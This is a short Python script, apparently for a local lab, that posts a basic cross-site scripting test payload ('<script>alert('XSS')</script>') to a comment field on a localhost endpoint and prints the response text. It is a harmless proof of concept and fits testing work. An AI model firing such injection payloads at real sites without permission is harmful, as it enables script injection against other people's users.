import requests
from bs4 import BeautifulSoup

url = "http://localhost:5000/xss"
payload = "<script>alert('XSS')</script>"

print("[+] XSS Payload Test")
r = requests.post(url, data={"comment": payload})
soup = BeautifulSoup(r.text, 'html.parser')
print("Response Output:", soup.find("p").text)
